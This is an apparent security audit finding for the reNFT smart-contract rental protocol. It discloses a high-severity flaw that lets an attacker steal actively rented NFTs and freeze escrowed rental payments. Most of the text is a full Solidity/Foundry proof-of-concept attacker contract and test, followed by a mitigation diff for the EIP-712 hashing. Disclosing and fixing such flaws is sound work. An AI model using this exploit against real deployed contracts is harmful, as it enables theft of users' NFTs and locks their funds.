| Severity | Title | 
|:--:|:---|
| [H-01](#h-01-malicious-actor-can-steal-any-actively-rented-nft-and-freeze-the-rental-payments-of-the-affected-rentals-in-the-escrow-contract) | Malicious actor can steal any actively rented NFT and freeze the rental payments (of the affected rentals) in the escrow contract |


# [H-01] Malicious actor can steal any actively rented NFT and freeze the rental payments (of the affected rentals) in the escrow contract
## Impact
A malicious actor is able to steal any actively rented NFT using the exploit path detailed in the first section. The capital requirements for the exploiter are as follows: 1) Have at least 1 wei of an ERC20 that will be used to create a malicious RentalOrder (the exploiter will receive these funds back at the end of the exploit). 2) create and deploy a attackerContract and a safe wallet (gas costs). 3) Additional gas costs will be incurred if exploiting several victim RentalOrders at once via stopRentBatch.

This will result in the specified NFT to be stolen from the victim's safe wallet and transferred to the attacker's safe wallet. Since the attacker's rental order was atomically created and stopped during this function call, no one will be able to call stopRent for this malicious RentalOrder, rendering the stolen NFT frozen in the attacker's safe wallet. Additionally, the victim RentalOrders will not be able to be stopped upon expiration since the reclamation process that occurs during the stopRent function call will fail (victim safe wallet no longer is the owner of the stolen NFT). This will result in the rental payment for this victim RentalOrder to be frozen in the escrow contract. An exploiter is able to prepare this exploit for multiple victim RentalOrders and steal multiple NFTs in one transaction via stopRentBatch.

## Proof of Concept
In order to provide more context for the PoC provided below, I will detail the steps that are occuring in the PoC:

Two orders are created (these will act as our victim orders). One will be for an ERC721 token and the other will be for an ERC1155 token.
Our attackerContract is created.
x amount of wei (for an arbitrary ERC20) is sent to our attackerContract. x == num_of_victim_orders. These funds will be used when the attackerContract programatically creates the malicious rental orders (our attackerContract will behave as lender and renter).
A safe wallet is created (attacker safe) and our attackerContract is initialized as an owner for that safe.
A generic signature is obtained via a OrderMetadata struct from one of the target orders that were initially created (in practice the order used can be any order).
Order structs were created and partially filled with values that pertain to the PAY and PAYEE orders that our attackerContract will create on-chain via Seaport::validate. The only fields that are not set during this process are the OfferItem or ConsiderationItem fields that specify the ERC721 or ERC1155 token that we will be stealing (these are dyanmic and therefore are determined during the callback functions). The Order structs are then stored in the attackerContract for later use.
This same process is done for the AdvancedOrder structs that are required for the fulfillment transaction (i.e. Seaport::matchAdvancedOrders). The AdvancedOrder structs are then stored in the attackerContract for later use.
The Fulfillment struct (required during the Seaport::matchAdvancedOrders function call) is pre-constructed. This struct willl remain the same for all of our order creations. This struct is also stored in the attackerContract for later use.
The RentalOrder.seaportOrderHash (this is the same as the orderHash that is computed for our Order during the call to Seaport::validate) is pre-computed via Seaport::getOrderHash. Note that this orderHash needs to be computed with a complete Order struct. Since our Order structs were only partially filled during step 6, we will use the RentalOrder.items field of the target RentalOrder to retrieve the details of the ERC721/ERC1155 token(s) that we will be stealing. We will then use these details to temporarily construct our actual Order struct and therefore pre-compute the required orderHash.
Using the items field of the victim RentalOrder, we will create our malicious RentalOrder.
The attackerContract will initiate a call to stopRent and pass in our malicious RentalOrder. However, we will first set RentalOrder.rentalWallet equal to the rentalWallet of our victim RentalOrder (the safe wallet that we will be stealing the NFT from).
Steps 9 - 11 will be performed for multiple victim RentalOrders by looping over the orders and computing the necessary malicious RentalOrders. This time, instead of the attackerContract initiating a call to stopRent, a call to stopRentBatch will be initiated and an array of the malicious RentalOrders will be supplied.
The resulting state will be validated: attacker safe is now the owner of all the stolen NFTs and the victim RentalOrders can no longer be stopped (even after their expiration).
Place the following test inside of the /test/integration/ directory and run test with forge test --mc StealAllRentedNFTs_POC

The below PoC showcases how an attacker can leverage all the bugs described in this report to steal multiple actively rented NFTs via stopRentBatch.
```solidity
// SPDX-License-Identifier: BUSL-1.1
pragma solidity ^0.8.20;

import {BaseTest} from "@test/BaseTest.sol";

import {
    OrderType, 
    OrderMetadata, 
    RentalOrder,
    RentPayload,
    OrderFulfillment,
    Item,
    SettleTo,
    ItemType as reNFTItemType
} from "@src/libraries/RentalStructs.sol";

import {
    ConsiderationItem,
    OfferItem,
    OrderParameters,
    OrderComponents,
    Order,
    AdvancedOrder,
    ItemType,
    CriteriaResolver,
    Fulfillment, 
    FulfillmentComponent,
    OrderType as SeaportOrderType
} from "@seaport-types/lib/ConsiderationStructs.sol";

import {MockERC721} from "../mocks/tokens/standard/MockERC721.sol";
import {MockERC20} from "../mocks/tokens/standard/MockERC20.sol";
import {MockERC1155} from "../mocks/tokens/standard/MockERC1155.sol";
import {Seaport} from "../fixtures/external/Seaport.sol";
import {OrderParametersLib} from "@seaport-sol/SeaportSol.sol";
import {SafeL2} from "@safe-contracts/SafeL2.sol";
import {Stop} from "../fixtures/protocol/Protocol.sol";


contract AttackerContract {
    address safe;
    address seaportConduit;
    Seaport seaport;
    Order payOrder;
    Order payeeOrder;
    AdvancedOrder payAdvancedOrder;
    AdvancedOrder payeeAdvancedOrder;
    Fulfillment fulfillmentERC721;
    Fulfillment fulfillmentERC20;

    constructor (address _conduit, address _token, Seaport _seaport) public {
        seaportConduit = _conduit;
        seaport = _seaport;
        MockERC20(_token).approve(_conduit, type(uint256).max);
    }

    function getPayOrderParams() external view returns (OrderParameters memory) {
        return payOrder.parameters;
    }

    function getPayeeOrderParams() external view returns (OrderParameters memory) {
        return payeeOrder.parameters;
    }

    function getPayOrderParamsToHash(
        ItemType itemType, 
        address token, 
        uint256 tokenId, 
        uint256 amount
    ) external view returns (OrderParameters memory) {
        OrderParameters memory parameters = payOrder.parameters;
        parameters.offer[0].itemType = itemType;
        parameters.offer[0].token = token;
        parameters.offer[0].identifierOrCriteria = tokenId;
        parameters.offer[0].startAmount = amount;
        parameters.offer[0].endAmount = amount;

        return parameters;
    }

    function storeSafe(address _safe) external {
        safe = _safe;
    }

    function storePayOrder(Order calldata _order) external {
        payOrder = _order;
    }

    function storePayeeOrder(Order calldata _order) external {
        payeeOrder = _order;
    }

    function storePayAdvancedOrder(AdvancedOrder calldata _advancedOrder) external {
        payAdvancedOrder = _advancedOrder;
    }

    function storePayeeAdvancedOrder(AdvancedOrder calldata _advancedOrder) external {
        payeeAdvancedOrder = _advancedOrder;
    }

    function storeFulfillment(Fulfillment calldata _fulfillmentERC721, Fulfillment calldata _fulfillmentERC20) external {
        fulfillmentERC721 = _fulfillmentERC721;
        fulfillmentERC20 = _fulfillmentERC20;
    }

    function stopRental(RentalOrder calldata rentalOrder, Stop stop) external {
        stop.stopRent(rentalOrder);
    }

    function stopRentals(RentalOrder[] calldata rentalOrders, Stop stop) external {
        stop.stopRentBatch(rentalOrders);
    }

    function onERC1155Received(
        address ,
        address ,
        uint256 tokenId,
        uint256 amount,
        bytes calldata
    ) external returns (bytes4) {
        address token = msg.sender;

        _executeCallback(ItemType.ERC1155, token, tokenId, amount);

        return this.onERC1155Received.selector;
    }

    function onERC721Received(
        address ,
        address ,
        uint256 tokenId,
        bytes calldata 
    ) external returns (bytes4) {
        address token = msg.sender;
        uint256 amount = 1;
        
        _executeCallback(ItemType.ERC721, token, tokenId, amount);

        return this.onERC721Received.selector;
    }

    function _executeCallback(ItemType itemType, address token, uint256 tokenId, uint256 amount) internal {
        // update storage for this specific nft
        _initializeNFT(itemType, token, tokenId, amount);

        // approve seaport to handle received NFT 
        _approveSeaportConduit(itemType, token, tokenId);

        // validate pay order 
        _validateOnChain(payOrder);

        // validate payee order
        _validateOnChain(payeeOrder);

        // fulfill order as renter
        _fulfillOrder();
    }

    function _approveSeaportConduit(ItemType itemType, address token, uint256 tokenId) internal {
        if (itemType == ItemType.ERC721) {
            MockERC721(token).approve(seaportConduit, tokenId);
        }
        if (itemType == ItemType.ERC1155) {
            MockERC1155(token).setApprovalForAll(seaportConduit, true);
        }
    }

    function _validateOnChain(Order memory order) internal {
        Order[] memory orders = new Order[](1);
        orders[0] = order;
        seaport.validate(orders);
    }

    function _fulfillOrder() internal {
        AdvancedOrder[] memory advancedOrders = new AdvancedOrder[](2);
        advancedOrders[0] = payAdvancedOrder;
        advancedOrders[1] = payeeAdvancedOrder;

        Fulfillment[] memory fulfillments = new Fulfillment[](2);
        fulfillments[0] = fulfillmentERC721;
        fulfillments[1] = fulfillmentERC20;

        seaport.matchAdvancedOrders(
            advancedOrders,
            new CriteriaResolver[](0),
            fulfillments,
            address(0)
        );
    }

    function _initializeNFT(ItemType itemType, address token, uint256 tokenId, uint256 amount) internal {
        payAdvancedOrder.parameters.offer[0].itemType = itemType;
        payAdvancedOrder.parameters.offer[0].token = token;
        payAdvancedOrder.parameters.offer[0].identifierOrCriteria = tokenId;
        payAdvancedOrder.parameters.offer[0].startAmount = amount;
        payAdvancedOrder.parameters.offer[0].endAmount = amount;

        payeeAdvancedOrder.parameters.consideration[0].itemType = itemType;
        payeeAdvancedOrder.parameters.consideration[0].token = token;
        payeeAdvancedOrder.parameters.consideration[0].identifierOrCriteria = tokenId;
        payeeAdvancedOrder.parameters.consideration[0].startAmount = amount;
        payeeAdvancedOrder.parameters.consideration[0].endAmount = amount;
        payeeAdvancedOrder.parameters.consideration[0].recipient = payable(safe);

        payOrder.parameters.offer[0].itemType = itemType;
        payOrder.parameters.offer[0].token = token;
        payOrder.parameters.offer[0].identifierOrCriteria = tokenId;
        payOrder.parameters.offer[0].startAmount = amount;
        payOrder.parameters.offer[0].endAmount = amount;

        payeeOrder.parameters.consideration[0].itemType = itemType;
        payeeOrder.parameters.consideration[0].token = token;
        payeeOrder.parameters.consideration[0].identifierOrCriteria = tokenId;
        payeeOrder.parameters.consideration[0].startAmount = amount;
        payeeOrder.parameters.consideration[0].endAmount = amount;
        payeeOrder.parameters.consideration[0].recipient = payable(safe);
    }
}

contract StealAllRentedNFTs_POC is BaseTest {

    function testStealAllRentedNFTs() public {
        // ------ Setting up previous state ------ //

        // create and fulfill orders that we will exploit
        (
            Order memory order, 
            OrderMetadata memory metadata, 
            RentalOrder[] memory victimRentalOrders
        ) = _createAndFulfillVictimOrders();

        // ------ Prerequisites ------ //

        // instantiate attackerContract
        AttackerContract attackerContract = new AttackerContract(
            address(conduit), // seaport conduit
            address(erc20s[0]), // token we will use for our rental orders
            seaport
        );

        // send arbitrary # of ERC20 tokens for rental payment to our attackerContract
        erc20s[0].mint(address(attackerContract), victimRentalOrders.length); // we will be stealing from two rentals and use 1 wei for each

        // create a safe for our attackerContract
        address attackerSafe;
        { // to fix stack too deep errors
            address[] memory owners = new address[](1);
            owners[0] = address(attackerContract);
            attackerSafe = factory.deployRentalSafe(owners, 1);
        }
        attackerContract.storeSafe(attackerSafe);
        
        // obtain generic signature for `RentPayload` 
        // this is done via the front-end for any order and we will then use matching `OrderMetadata.rentDuration` and `OrderMetadata.hooks` fields when creating our new order
        // `RentPayload.intendedFulfiller` will be our attackerContract and `RentPayload.fulfillment` will be our attackerContract's safe
        // any expiration given to us by the front-end would do since we will be executing these actions programmatically
        RentPayload memory rentPayload = RentPayload(
            OrderFulfillment(attackerSafe), 
            metadata, 
            block.timestamp + 100, 
            address(attackerContract)
        ); // using Alice's metadata (order) as an example, but could realistically be any order

        // generate the signature for the payload (simulating signing an order similar to Alice's (metadata only) via the front end)
        bytes memory signature = _signProtocolOrder(
            rentalSigner.privateKey,
            create.getRentPayloadHash(rentPayload)
        );

        // ------ Prep `attackerContract` ------ //

        // precompute `validate()` calldata for new order (PAY order) for on-chain validation
        // re-purpose Alice's order (for simplicity) for our use by replacing all necessary fields with values that pertain to our new order
        order.parameters.offerer = address(attackerContract);
        { // to fix stack too deep errors
            ConsiderationItem[] memory considerationItems = new ConsiderationItem[](0);
            order.parameters.consideration = considerationItems; // no consideration items for a PAY order

            OfferItem[] memory offerItems = new OfferItem[](2);
            // offerItems[0] will change dynamically in our attacker contract
            offerItems[1] = OfferItem({
                itemType: ItemType.ERC20,
                token: address(erc20s[0]),
                identifierOrCriteria: uint256(0),
                startAmount: uint256(1),
                endAmount: uint256(1)
            });

            order.parameters.offer = offerItems;

            order.parameters.totalOriginalConsiderationItems = 0; // 0 since this is a PAY order
            
            // store `validate()` calldata for PAY order in attackerContract for later use
            attackerContract.storePayOrder(order);
        }

        // precompute `validate()` calldata for new order (PAYEE order) for on-chain validation (attackerContract is offerer and fulfiller)
        { // to fix stack too deep errors
            ConsiderationItem[] memory considerationItems = new ConsiderationItem[](2);
            // considerationItems[0] will change dynamically in our attacker contract
            considerationItems[1] = ConsiderationItem({
                itemType: ItemType.ERC20,
                token: address(erc20s[0]),
                identifierOrCriteria: uint256(0),
                startAmount: uint256(1),
                endAmount: uint256(1),
                recipient: payable(address(ESCRW))
            });

            order.parameters.consideration = considerationItems; // considerationItems for PAYEE mirror offerItems from PAY

            OfferItem[] memory offerItems = new OfferItem[](0);
            order.parameters.offer = offerItems; // no offerItems for PAYEE

            order.parameters.totalOriginalConsiderationItems = 2; // 2 since this is our PAYEE order

            // store `validate()` calldata for PAYEE order in attackerContract for later use
            attackerContract.storePayeeOrder(order);
        }

        // precompute `matchAdvancedOrders()` calldata for fulfillment of the two orders (PAY + PAYEE) and store in attackerContract
        // construct AdvancedOrder[] calldata
        { // to fix stack too deep errors
            rentPayload.metadata.orderType = OrderType.PAY; // modify OrderType to be a PAY order (necessary for exploit). orderType not checked during signature validation
            AdvancedOrder memory payAdvancedOrder = AdvancedOrder(
                attackerContract.getPayOrderParams(), 
                1, 
                1, 
                hex"",  // signature does not matter 
                abi.encode(rentPayload, signature) // extraData. Note: we are re-using the signature we received from alice's metadata
            );
            rentPayload.metadata.orderType = OrderType.PAYEE; // modify OrderType to be a PAYEE order (necessary for exploit). orderType not checked during signature validation
            AdvancedOrder memory payeeAdvancedOrder = AdvancedOrder(
                attackerContract.getPayeeOrderParams(), 
                1, 
                1, 
                hex"",  // signature does not matter 
                abi.encode(rentPayload, signature) // extraData. Note: we are re-using the signature we received from alice's metadata
            );
            
            // store AdvancedOrder structs in attackerContract for later use
            attackerContract.storePayAdvancedOrder(payAdvancedOrder);
            attackerContract.storePayeeAdvancedOrder(payeeAdvancedOrder);
        }

        // construct Fulfillment[] calldata
        { // to fix stack too deep errors
            FulfillmentComponent[] memory offerCompERC721 = new FulfillmentComponent[](1);
            FulfillmentComponent[] memory considCompERC721 = new FulfillmentComponent[](1);

            offerCompERC721[0] = FulfillmentComponent({orderIndex: 0, itemIndex: 0});
            considCompERC721[0] = FulfillmentComponent({orderIndex: 1, itemIndex: 0});

            FulfillmentComponent[] memory offerCompERC20 = new FulfillmentComponent[](1);
            FulfillmentComponent[] memory considCompERC20 = new FulfillmentComponent[](1);

            offerCompERC20[0] = FulfillmentComponent({orderIndex: 0, itemIndex: 1});
            considCompERC20[0] = FulfillmentComponent({orderIndex: 1, itemIndex: 1});

            Fulfillment memory fulfillmentERC721 = Fulfillment({offerComponents: offerCompERC721, considerationComponents: considCompERC721});
            Fulfillment memory fulfillmentERC20 = Fulfillment({offerComponents: offerCompERC20, considerationComponents: considCompERC20});
            
            // store Fulfillment[] in attackerContract for later use
            attackerContract.storeFulfillment(fulfillmentERC721, fulfillmentERC20);
        }

        // ------ loop through victimRentalOrders to create our complimentary, malicious rentalOrders ------ //

        // pre-compute `RentalOrder` for our new rental orders
        // compute ZoneParameters.orderHash (this is the orderHash for our PAY order)
        RentalOrder[] memory rentalOrders = new RentalOrder[](victimRentalOrders.length);

        for (uint256 i; i < victimRentalOrders.length; i++) {
            Item memory victimItem = victimRentalOrders[i].items[0];
            ItemType itemType;
            if (victimItem.itemType == reNFTItemType.ERC721) {
                itemType = ItemType.ERC721;
            }
            if (victimItem.itemType == reNFTItemType.ERC1155) {
                itemType = ItemType.ERC1155;
            }

            bytes32 orderHash = seaport.getOrderHash(OrderParametersLib.toOrderComponents(
                attackerContract.getPayOrderParamsToHash(itemType, victimItem.token, victimItem.identifier, victimItem.amount), 0)
            );

            // construct the malicious rental order
            Item[] memory items = new Item[](2);
            items[0] = Item(victimItem.itemType, SettleTo.LENDER, victimItem.token, victimItem.amount, victimItem.identifier);
            items[1] = Item(reNFTItemType.ERC20, SettleTo.RENTER, address(erc20s[0]), uint256(1), uint256(0)); // the same for every malicious order

            RentalOrder memory rentalOrder = RentalOrder({
                seaportOrderHash: orderHash,
                items: items, // only PAY order offer items are added in storage
                hooks: metadata.hooks,
                orderType: OrderType.PAY, // only PAY order is added in storage
                lender: address(attackerContract),
                renter: address(attackerContract),
                rentalWallet: attackerSafe,
                startTimestamp: block.timestamp,
                endTimestamp: block.timestamp + metadata.rentDuration // note: rentDuration does not matter
            });

            // set `rentalOrder.rentalWallet` (currently equal to our attackerContract's safe) to be equal to the victim's safe
            rentalOrder.rentalWallet = victimRentalOrders[i].rentalWallet;

            rentalOrders[i] = rentalOrder;
        }

        // ------ Execute exploit ------ //

        // call `stopRentBatch(rentalOrders)`. All fields pertain to our soon-to-be created orders, except for the `rentalWallet`, which is pointing to the victim's safe
        // attackerContract.stopRental(rentalOrder[0], stop);
        // attackerContract.stopRental(rentalOrder[1], stop);
        attackerContract.stopRentals(rentalOrders, stop);
        
        // ------ Loop over all victimRentalOrders to verify end state ------ //

        // speed up in time past the victimRentalOrders' expiration
        vm.warp(block.timestamp + 750);

        for (uint256 i; i < victimRentalOrders.length; i++) {
            Item memory victimItem = victimRentalOrders[i].items[0];

            // verify that our attackerContract's safe is now the owner of the NFT
            if (victimItem.itemType == reNFTItemType.ERC721) {
                assertEq(MockERC721(victimItem.token).ownerOf(victimItem.identifier), attackerSafe);
            }
            if (victimItem.itemType == reNFTItemType.ERC1155) {
                assertEq(MockERC1155(victimItem.token).balanceOf(attackerSafe, victimItem.identifier), victimItem.amount);
            }

            // verify that our rentalOrder has been stopped (deleted from storage)
            RentalOrder memory rentalOrder = rentalOrders[i];
            bytes32 rentalOrderHash = create.getRentalOrderHash(rentalOrder);
            assertEq(STORE.orders(rentalOrderHash), false);

            // lender attempts to stop victimRentalOrder, but call fails (renter's safe is no longer the owner of the NFT)
            vm.startPrank(victimRentalOrders[i].lender);
            vm.expectRevert();
            stop.stopRent(victimRentalOrders[i]);
            vm.stopPrank();

            // verify that victimRentalOrder has not been stopped (is still in storage)
            bytes32 victimRentalOrderHash = create.getRentalOrderHash(victimRentalOrders[i]);
            assertEq(STORE.orders(victimRentalOrderHash), true);
        }

        // renters' rental payments to lenders' is still in the escrow contract
        assertEq(erc20s[0].balanceOf(address(ESCRW)), uint256(victimRentalOrders.length * 100));

        // verify that our attackerContract received its rental payment back from all the created malicious orders
        assertEq(erc20s[0].balanceOf(address(attackerContract)), victimRentalOrders.length);

        // End result:
        // 1. Lenders' NFTs were stolen from renters' safe wallet and is now frozen in the attackerContract's safe wallet
        // 2. Renters' rental payments to Lenders are frozen in the Escrow contract since their rentals can not be stoppped
    }

    function _createAndFulfillVictimOrders() internal returns (
        Order memory order, 
        OrderMetadata memory metadata,
        RentalOrder[] memory rentalOrders
    ) {
        // create a BASE order ERC721
        createOrder({
            offerer: alice,
            orderType: OrderType.BASE,
            erc721Offers: 1,
            erc1155Offers: 0,
            erc20Offers: 0,
            erc721Considerations: 0,
            erc1155Considerations: 0,
            erc20Considerations: 1
        });

        // finalize the order creation 
        (
            Order memory order,
            bytes32 orderHash,
            OrderMetadata memory metadata
        ) = finalizeOrder();

        // create an order fulfillment
        createOrderFulfillment({
            _fulfiller: bob,
            order: order,
            orderHash: orderHash,
            metadata: metadata
        });

        // finalize the base order fulfillment
        RentalOrder memory rentalOrderA = finalizeBaseOrderFulfillment();
        bytes32 rentalOrderHash = create.getRentalOrderHash(rentalOrderA);

        // assert that the rental order was stored
        assertEq(STORE.orders(rentalOrderHash), true);

        // assert that the token is in storage
        assertEq(STORE.isRentedOut(address(bob.safe), address(erc721s[0]), 0), true);

        // assert that the fulfiller made a payment
        assertEq(erc20s[0].balanceOf(bob.addr), uint256(9900));

        // assert that a payment was made to the escrow contract
        assertEq(erc20s[0].balanceOf(address(ESCRW)), uint256(100));

        // assert that a payment was synced properly in the escrow contract
        assertEq(ESCRW.balanceOf(address(erc20s[0])), uint256(100));

        // assert that the ERC721 is in the rental wallet of the fulfiller
        assertEq(erc721s[0].ownerOf(0), address(bob.safe));

        // create a BASE order ERC1155
        createOrder({
            offerer: carol,
            orderType: OrderType.BASE,
            erc721Offers: 0,
            erc1155Offers: 1,
            erc20Offers: 0,
            erc721Considerations: 0,
            erc1155Considerations: 0,
            erc20Considerations: 1
        });

        // finalize the order creation 
        (
            order,
            orderHash,
            metadata
        ) = finalizeOrder();

        // create an order fulfillment
        createOrderFulfillment({
            _fulfiller: dan,
            order: order,
            orderHash: orderHash,
            metadata: metadata
        });

        // finalize the base order fulfillment
        RentalOrder memory rentalOrderB = finalizeBaseOrderFulfillment();
        rentalOrderHash = create.getRentalOrderHash(rentalOrderB);

        // assert that the rental order was stored
        assertEq(STORE.orders(rentalOrderHash), true);

        // assert that the token is in storage
        assertEq(STORE.isRentedOut(address(dan.safe), address(erc1155s[0]), 0), true);

        // assert that the fulfiller made a payment
        assertEq(erc20s[0].balanceOf(dan.addr), uint256(9900));

        // assert that a payment was made to the escrow contract
        assertEq(erc20s[0].balanceOf(address(ESCRW)), uint256(200));

        // assert that a payment was synced properly in the escrow contract
        assertEq(ESCRW.balanceOf(address(erc20s[0])), uint256(200));

        // assert that the ERC721 is in the rental wallet of the fulfiller
        assertEq(erc1155s[0].balanceOf(address(dan.safe), 0), uint256(100));

        RentalOrder[] memory rentalOrders = new RentalOrder[](2);
        rentalOrders[0] = rentalOrderA;
        rentalOrders[1] = rentalOrderB;

        return (order, metadata, rentalOrders);
    }
}
```

## Lines of code
https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Stop.sol#L265-L302
https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Stop.sol#L313-L363

## Tool used
Manual Review

## Recommended Mitigation Steps
By addressing the non-compliant EIP-712 functions we can mitigate the main exploit path described in this report. I would suggest the following changes:
```diff
diff --git a/./src/packages/Signer.sol b/./src/packages/Signer.sol
index 6edf32c..ab7e62e 100644
--- a/./src/packages/Signer.sol
+++ b/./src/packages/Signer.sol
@@ -188,6 +188,7 @@ abstract contract Signer {
                     order.orderType,
                     order.lender,
                     order.renter,
+                    order.rentalWallet,
                     order.startTimestamp,
                     order.endTimestamp
                 )
diff --git a/./src/packages/Signer.sol b/./src/packages/Signer.sol
index 6edf32c..c2c375c 100644
--- a/./src/packages/Signer.sol
+++ b/./src/packages/Signer.sol
@@ -232,8 +232,10 @@ abstract contract Signer {
             keccak256(
                 abi.encode(
                     _ORDER_METADATA_TYPEHASH,
+                    metadata.orderType,
                     metadata.rentDuration,
-                    keccak256(abi.encodePacked(hookHashes))
+                    keccak256(abi.encodePacked(hookHashes)),
+                    metadata.emittedExtraData
                 )
             );
     }
```
I would also suggest that the RentPayload, which is the signature digest of the server-side signer, be modified to include a field that is unique to the specific order that is being signed. This would disable users from obtaining a single signature and utilizing that signature arbitrarily (for multiple fulfillments/fulfill otherwise "restricted" orders).
